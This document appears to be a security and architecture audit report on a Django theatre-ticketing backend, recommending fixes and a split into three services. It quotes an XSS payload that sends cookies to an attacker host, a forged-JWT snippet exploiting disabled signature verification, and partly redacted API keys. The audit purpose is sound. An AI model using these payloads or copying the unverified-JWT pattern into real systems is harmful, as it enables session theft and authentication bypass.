# Backend Architecture Analysis Report

**Project**: tickets-be (Django 5.2 Backend)
**Date**: December 2024
**Scope**: Full architectural review, security audit, and separation recommendation

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Project Overview](#2-project-overview)
3. [Architecture Analysis](#3-architecture-analysis)
4. [Security Audit](#4-security-audit)
5. [Design Gaps](#5-design-gaps)
6. [App Separation Recommendation](#6-app-separation-recommendation)
7. [Action Items](#7-action-items)

---

## 1. Executive Summary

### Overall Assessment

| Aspect | Score | Status |
|--------|-------|--------|
| Architecture | 7/10 | Good |
| Security | 3/10 | Critical Issues |
| Code Quality | 6/10 | Needs Improvement |
| Maintainability | 5/10 | Fair |

### Key Findings

- **4 CRITICAL** security vulnerabilities requiring immediate action
- **5 HIGH** severity issues to address within 1 sprint
- **6 MEDIUM** severity issues for planned remediation
- Strong recommendation to **separate into 3 distinct services**

### Immediate Actions Required

1. Fix JWT signature verification bypass (authentication.py)
2. Rotate all exposed API keys in .env
3. Fix XSS vulnerabilities in HTML generation
4. Disable CORS_ALLOW_ALL_ORIGINS

---

## 2. Project Overview

### 2.1 Django Apps

| App | Purpose | Models | Complexity |
|-----|---------|--------|------------|
| `show` | Shows, festivals, theaters, reservations | 7 | Medium |
| `hita` | HITA member profiles, performers | 10 | High |
| `hita_arab_festival` | Arab Festival shows, articles | 7 | Medium |
| `hita_evaluation` | Course/professor evaluation surveys | 12 | High |
| `ai` | OpenAI embeddings, semantic search | 1 | Medium |
| `social_login` | Google/Facebook OAuth, email signup | 1 | Low |
| `eldorg` | Script management | 1 | Low |

### 2.2 Technology Stack

```
Framework:     Django 5.2.9 + DRF 3.16.1
Database:      PostgreSQL (prod) / SQLite (dev)
Cache/Queue:   Redis + Celery
Storage:       AWS S3 (prod) / Local filesystem (dev)
Auth:          JWT (SimpleJWT) + OAuth (Google/Facebook)
AI:            OpenAI embeddings + pgvector
```

### 2.3 Business Domains

The project serves **three distinct business domains**:

1. **Theatre Platform** (`show`, `hita`, `hita_arab_festival`, `ai`, `eldorg`)
   - Show listings and reservations
   - Performer profiles and portfolios
   - AI-powered performer search
   - Script management

2. **Evaluation System** (`hita_evaluation`)
   - Course/professor evaluation surveys
   - Dashboard analytics
   - Semester/regulation management

3. **Authentication** (`social_login`)
   - Cross-cutting concern for all domains

---

## 3. Architecture Analysis

### 3.1 Strengths

1. **Clean Separation of Concerns**
   - Models split into separate files with `__init__.py` exports
   - ViewSets organized in dedicated directories
   - Serializers properly separated from views

2. **DRF Best Practices**
   - Custom permission classes for access control
   - Standardized response format via `utils/Response.py`
   - Proper use of serializers for validation

3. **Async Task Processing**
   - Celery integration for email sending
   - Redis as message broker
   - Non-blocking operations for heavy tasks

4. **AI Integration**
   - pgvector for semantic search
   - OpenAI embeddings for performer profiles
   - Feature extraction via structured prompts

### 3.2 Weaknesses

1. **Monolithic Structure**
   - Unrelated domains (theatre vs evaluation) share same codebase
   - Shared database increases coupling
   - Deployment requires all-or-nothing updates

2. **Mixed Responsibilities in ViewSets**
   ```python
   # PerformerViewSet handles too many concerns:
   - CRUD operations
   - Complex filtering logic
   - Gallery management
   - Permission checks
   - Open Graph meta generation
   ```

3. **Inconsistent Patterns**
   - Some ViewSets use mixins, others use ModelViewSet
   - Error handling varies across views
   - Validation logic scattered between serializers and views

4. **Missing Service Layer**
   - Business logic embedded in ViewSets
   - No reusable service classes
   - Difficult to unit test business rules

### 3.3 Model Relationships

```
User (Django Auth)
├── HITAMember (1:1)
│   ├── Performer (1:1)
│   │   ├── Experience (1:N)
│   │   ├── Achievement (1:N)
│   │   ├── Gallery (1:N)
│   │   ├── ContactDetail (1:N)
│   │   └── PerformerInsights (1:1)
│   └── favorite_performers (M:N)
├── Show.created_by (1:N)
└── SurveySession (1:N via implicit relation)

Show
├── Festival (N:1)
├── ShowDate (1:N)
└── Reservation (1:N)

Course
├── Professor (M:N via CourseProfessor)
├── Semester (N:1)
└── SurveySession (M:N)
```

---

## 4. Security Audit

### 4.1 CRITICAL Vulnerabilities

#### CVE-LEVEL-1: JWT Signature Verification Disabled

**File**: `social_login/authentication.py:19-20`

```python
decoded_token = jwt.decode(
    auth_header.split(' ')[1],
    options={"verify_signature": False}  # CRITICAL!
)
```

**Impact**: Complete authentication bypass. Attackers can forge any Google JWT token.

**Attack Vector**:
```python
# Attacker creates fake token
fake_token = jwt.encode({"email": "admin@company.com"}, "any_key")
# Server accepts it without verification!
```

**Fix**:
```python
from google.auth.transport import requests
from google.oauth2 import id_token

def verify_google_token(token):
    return id_token.verify_oauth2_token(
        token,
        requests.Request(),
        GOOGLE_CLIENT_ID
    )
```

---

#### CVE-LEVEL-2: XSS in HTML Generation

**Files**:
- `hita/views/PerformerViewSet.py:215-240`
- `hita_arab_festival/views.py:26-60`

```python
html_content = f"""
    <meta property="og:title" content="{performer.full_name}">
    <script>window.location.href = "{frontend_url}";</script>
"""
```

**Impact**: Stored XSS allowing cookie theft, session hijacking.

**Attack Payload**:
```
performer.full_name = '"><script>fetch("https://evil.com/?c="+document.cookie)</script>'
```

**Fix**:
```python
from django.utils.html import escape
from django.template.loader import render_to_string

def profile_meta(self, request, username):
    return HttpResponse(
        render_to_string('profile_meta.html', {
            'performer': performer,  # Auto-escaped in template
            'frontend_url': escape(frontend_url)
        }),
        content_type="text/html"
    )
```

---

#### CVE-LEVEL-3: Exposed Secrets in Repository

**File**: `.env` (should be in .gitignore)

```
SECRET_KEY=django-insecure-@kv*c4l7q+hn1r6...
OPENAI_API_KEY=sk-proj-bQoVyOftgpcUn5GkTXSf...
ZEPTO_API_KEY=wSsVR60i+h71XPsrlGL7c7s9...
```

**Impact**: Direct compromise of all services using these keys.

**Required Actions**:
1. Immediately rotate all exposed keys
2. Add `.env` to `.gitignore`
3. Use secrets manager (AWS Secrets Manager, HashiCorp Vault)
4. Enable git-secrets pre-commit hook

---

#### CVE-LEVEL-4: CORS Misconfiguration

**File**: `config/settings.py:135-142`

```python
CORS_ALLOW_ALL_ORIGINS = True        # Allows ANY origin
CORS_ALLOW_CREDENTIALS = True         # Sends cookies to ANY origin
```

**Impact**: CSRF attacks from any website can access authenticated endpoints.

**Fix**:
```python
CORS_ALLOW_ALL_ORIGINS = False
CORS_ALLOWED_ORIGINS = [
    "https://play-cast.com",
    "https://admin.play-cast.com",
]
CORS_ALLOW_CREDENTIALS = True  # Only with explicit whitelist
```

---

### 4.2 HIGH Severity Issues

| Issue | Location | Risk |
|-------|----------|------|
| No rate limiting on auth endpoints | `social_login/views.py` | Brute force attacks |
| User created active without email verification | `social_login/views.py:26-35` | Account takeover |
| Weak file upload validation (extension only) | `utils/code_utils.py:98-102` | Malware upload |
| Weak reservation hash generation | `show/models/Reservation.py:27-29` | Hash collision |
| Missing CSRF token validation | Various POST endpoints | CSRF attacks |

### 4.3 MEDIUM Severity Issues

| Issue | Location | Risk |
|-------|----------|------|
| Print statements in production | Multiple files | Information leakage |
| Bare exception handlers | `social_login/views.py` | Error masking |
| No JSON schema validation | JSONField models | Data corruption |
| Inconsistent error responses | `ai/views.py:11-17` | API confusion |
| Missing input length validation | Various serializers | DoS via large payloads |
| N+1 query patterns | Various ViewSets | Performance degradation |

### 4.4 Security Score Breakdown

```
Authentication:     2/10 (JWT bypass, no rate limiting)
Authorization:      6/10 (Good permission classes, missing object-level)
Input Validation:   4/10 (Minimal validation, no schema checks)
Output Encoding:    2/10 (XSS vulnerabilities)
Error Handling:     4/10 (Inconsistent, information leakage)
Configuration:      3/10 (CORS, exposed secrets)
Cryptography:       5/10 (Weak hashes, proper JWT otherwise)

Overall Security:   3/10
```

---

## 5. Design Gaps

### 5.1 Missing Components

| Component | Impact | Recommendation |
|-----------|--------|----------------|
| Service Layer | Business logic scattered | Extract to `services/` directory |
| API Documentation | No OpenAPI spec | Add `drf-spectacular` |
| Request/Response Logging | No audit trail | Add middleware logging |
| Health Check Endpoint | No monitoring | Add `/health/` endpoint |
| Database Connection Pooling | Connection exhaustion | Add `pgbouncer` |
| Caching Strategy | Repeated queries | Add Redis caching layer |

### 5.2 Code Quality Issues

**1. ViewSet Bloat**

`PerformerViewSet.py` is 450+ lines handling:
- CRUD operations
- Complex filtering with 15+ parameters
- Gallery file uploads
- Permission calculations
- Open Graph HTML generation

**Recommendation**: Split into:
```
performers/
├── views/
│   ├── crud.py           # Basic CRUD
│   ├── search.py         # Filtering/search
│   └── media.py          # Gallery/files
├── services/
│   ├── performer_service.py
│   └── gallery_service.py
└── permissions.py
```

**2. Missing Type Safety**

```python
# Current: No type hints, magic strings
def filter_data(self, query_params):
    if query_params.get('name'):
        ...

# Better: Type hints + Enums
def filter_data(self, query_params: QueryDict) -> Q:
    name: str | None = query_params.get('name')
    ...
```

**3. Inconsistent Error Handling**

```python
# File 1: Returns 200 with error in data
except Exception as e:
    return get_successful_response(data={"error": str(e)})

# File 2: Returns proper HTTP error
except Exception as e:
    return get_bad_request_response(message=str(e))

# File 3: Just prints and returns anonymous
except Exception as e:
    print('Auth Error', flush=True)
    return AnonymousUser(), 'NoData'
```

**Recommendation**: Create exception handler middleware with consistent format.

### 5.3 Database Design Issues

**1. Department as TextChoices (Not Normalized)**

```python
class Department(models.TextChoices):
    GENERAL = 'GENERAL', 'عام'
    ACTING = 'ACTING', 'التمثيل والإخراج'
    ...
```

Departments are duplicated across `hita_evaluation` and `hita` apps. Should be:
- Single `Department` model
- Foreign key relationships
- Admin-manageable

**2. JSON Fields Without Schema**

```python
class Show(models.Model):
    notes = models.JSONField(null=True, blank=True)
    cast = models.JSONField(null=True, blank=True)
    crew = models.JSONField(null=True, blank=True)
```

No validation ensures consistent structure. Recommendation: Use `jsonschema` validators.

**3. Missing Indexes**

Several frequently-filtered fields lack database indexes:
- `Performer.hita_member__first_name`
- `Show.status`
- `SurveySession.status`
- `Course.semester_id`

---

## 6. App Separation Recommendation

### 6.1 Should You Separate? **YES**

**Reasons for Separation:**

| Factor | Current State | Impact |
|--------|---------------|--------|
| Business Domains | 2 distinct domains sharing code | Coupling, complexity |
| Team Structure | Potentially different teams | Coordination overhead |
| Deployment | All-or-nothing deployments | Risk, downtime |
| Scaling | Same resources for all | Cost inefficiency |
| Data Isolation | Shared database | Security, compliance |

### 6.2 Recommended Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                        API Gateway                               │
│                   (nginx / AWS API Gateway)                      │
└─────────────────────────────────────────────────────────────────┘
         │                    │                    │
         ▼                    ▼                    ▼
┌─────────────────┐  ┌─────────────────┐  ┌─────────────────┐
│   Theatre API   │  │  Evaluation API │  │    Auth API     │
│                 │  │                 │  │                 │
│ - show          │  │ - hita_eval     │  │ - social_login  │
│ - hita          │  │ - dashboard     │  │ - JWT issuing   │
│ - arab_festival │  │                 │  │                 │
│ - ai            │  │                 │  │                 │
│ - eldorg        │  │                 │  │                 │
└────────┬────────┘  └────────┬────────┘  └────────┬────────┘
         │                    │                    │
         ▼                    ▼                    ▼
┌─────────────────┐  ┌─────────────────┐  ┌─────────────────┐
│  Theatre DB     │  │  Evaluation DB  │  │    Auth DB      │
│  (PostgreSQL)   │  │  (PostgreSQL)   │  │  (PostgreSQL)   │
└─────────────────┘  └─────────────────┘  └─────────────────┘
```

### 6.3 Service Boundaries

**Service 1: Theatre Platform API**
```
Apps: show, hita, hita_arab_festival, ai, eldorg
Models: Show, Festival, Performer, HITAMember, Experience, etc.
Database: theatre_db
Port: 8001
```

**Service 2: Evaluation API**
```
Apps: hita_evaluation
Models: Course, Professor, SurveySession, Semester, etc.
Database: evaluation_db
Port: 8002
```

**Service 3: Auth Service**
```
Apps: social_login (extracted and enhanced)
Models: User, Policy, Token
Database: auth_db (or shared users table)
Port: 8003
```

### 6.4 Migration Strategy

**Phase 1: Preparation (2 weeks)**
- Add API versioning (`/api/v1/`)
- Create OpenAPI documentation
- Add health check endpoints
- Set up separate database schemas

**Phase 2: Extract Auth Service (2 weeks)**
- Move `social_login` to separate repo
- Implement token validation endpoint
- Update other services to validate tokens remotely

**Phase 3: Extract Evaluation Service (3 weeks)**
- Move `hita_evaluation` to separate repo
- Set up separate database
- Configure CORS for new service

**Phase 4: Clean Theatre Service (2 weeks)**
- Remove evaluation code
- Optimize remaining apps
- Update deployment configs

### 6.5 Shared Components

Extract to shared packages:
```
tickets-common/
├── auth/
│   └── jwt_validator.py      # JWT validation logic
├── responses/
│   └── standard_response.py  # Response format
├── pagination/
│   └── custom_pagination.py  # Pagination class
└── email/
    └── zepto_client.py       # Email sending
```

---

## 7. Action Items

### 7.1 Critical (This Week)

| # | Task | Owner | Est. |
|---|------|-------|------|
| 1 | Fix JWT signature verification | Backend | 4h |
| 2 | Rotate all exposed API keys | DevOps | 2h |
| 3 | Fix XSS in HTML generation (2 files) | Backend | 4h |
| 4 | Disable CORS_ALLOW_ALL_ORIGINS | Backend | 1h |
| 5 | Add .env to .gitignore | Backend | 0.5h |

### 7.2 High Priority (Sprint 1)

| # | Task | Owner | Est. |
|---|------|-------|------|
| 6 | Add rate limiting to auth endpoints | Backend | 4h |
| 7 | Add email verification for signup | Backend | 8h |
| 8 | Add MIME type validation for uploads | Backend | 4h |
| 9 | Replace weak reservation hash | Backend | 2h |
| 10 | Add request/response logging | Backend | 4h |

### 7.3 Medium Priority (Sprint 2-3)

| # | Task | Owner | Est. |
|---|------|-------|------|
| 11 | Extract service layer from ViewSets | Backend | 16h |
| 12 | Add JSON schema validation | Backend | 8h |
| 13 | Add database indexes | Backend | 4h |
| 14 | Add API documentation (OpenAPI) | Backend | 8h |
| 15 | Replace print() with logging | Backend | 4h |
| 16 | Add unit tests for auth flow | QA | 16h |

### 7.4 Strategic (Quarter)

| # | Task | Owner | Est. |
|---|------|-------|------|
| 17 | Plan service separation | Architect | 1w |
| 18 | Extract Auth service | Backend | 2w |
| 19 | Extract Evaluation service | Backend | 3w |
| 20 | Set up API Gateway | DevOps | 1w |
| 21 | Implement caching strategy | Backend | 1w |

---

## Appendix A: Files Requiring Immediate Attention

```
CRITICAL:
├── social_login/authentication.py    (JWT bypass)
├── hita/views/PerformerViewSet.py    (XSS)
├── hita_arab_festival/views.py       (XSS)
├── config/settings.py                (CORS)
└── .env                              (Exposed secrets)

HIGH:
├── social_login/views.py             (No rate limiting)
├── utils/code_utils.py               (Weak validation)
├── show/models/Reservation.py        (Weak hash)
└── utils/email_utils.py              (Print statements)
```

## Appendix B: Recommended Tools

| Purpose | Tool | Why |
|---------|------|-----|
| API Docs | drf-spectacular | OpenAPI 3.0 generation |
| Rate Limiting | django-ratelimit | Simple decorator-based |
| Logging | structlog | Structured JSON logging |
| Security Scanning | bandit | Python security linter |
| Secret Detection | git-secrets | Pre-commit hook |
| MIME Validation | python-magic | File type detection |
| Schema Validation | jsonschema | JSON field validation |

---

**Report Generated**: December 2024
**Next Review**: After critical fixes implemented
